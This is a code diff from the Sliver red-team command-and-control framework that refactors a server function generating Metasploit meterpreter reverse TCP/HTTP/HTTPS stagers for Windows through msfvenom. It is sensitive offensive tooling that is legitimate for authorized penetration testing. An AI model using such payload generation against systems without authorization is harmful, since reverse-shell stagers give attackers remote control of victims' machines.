@@ -26,6 +26,7 @@ import (
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/msf"
 
 	"github.com/golang/protobuf/proto"
@@ -102,15 +103,17 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 }
 
 // MsfStage - Generate a MSF compatible stage
-func (rpc *Server) MsfStage(config *clientpb.EggConfig) ([]byte, error) {
+func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
 	var (
-		stage   []byte
+		MSFStage = &clientpb.MsfStager{
+			File: &commonpb.File{},
+		}
 		payload string
 		arch    string
 		uri     string
 	)
 
-	switch config.Arch {
+	switch req.GetArch() {
 	case "amd64":
 		arch = "x64"
 	default:
@@ -118,33 +121,41 @@ func (rpc *Server) MsfStage(config *clientpb.EggConfig) ([]byte, error) {
 	}
 
 	// TODO: change the hardcoded URI to something dynamically generated
-	switch config.Protocol {
-	case clientpb.EggConfig_TCP:
+	switch req.Protocol {
+	case clientpb.StageProtocol_TCP:
 		payload = "meterpreter/reverse_tcp"
-	case clientpb.EggConfig_HTTP:
+	case clientpb.StageProtocol_HTTP:
 		payload = "meterpreter/reverse_http"
 		uri = "/login.do"
-	case clientpb.EggConfig_HTTPS:
+	case clientpb.StageProtocol_HTTPS:
 		payload = "meterpreter/reverse_https"
 		uri = "/login.do"
 	default:
-		return stage, fmt.Errorf("Protocol not supported")
+		return MSFStage, fmt.Errorf("Protocol not supported")
+	}
+
+	// We only support windows at the moment
+	if req.GetOS() != "windows" {
+		return MSFStage, fmt.Errorf("%s is currently not suppoprted", req.GetOS())
 	}
 
 	venomConfig := msf.VenomConfig{
-		Os:       "windows", // We only support windows at the moment
+		Os:       req.GetOS(),
 		Payload:  payload,
-		LHost:    config.Host,
-		LPort:    uint16(config.Port),
+		LHost:    req.GetHost(),
+		LPort:    uint16(req.GetPort()),
 		Arch:     arch,
-		Format:   config.Format,
-		BadChars: []string{"\\x0a", "\\x00"}, // TODO: make this configurable
+		Format:   req.GetFormat(),
+		BadChars: req.GetBadChars(), // TODO: make this configurable
 		Luri:     uri,
 	}
+
 	stage, err := msf.VenomPayload(venomConfig)
 	if err != nil {
 		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		return stage, err
+		return MSFStage, err
 	}
-	return stage, nil
+	MSFStage.File.Data = stage
+	MSFStage.File.Name = generate.GetCodename()
+	return MSFStage, nil
 }
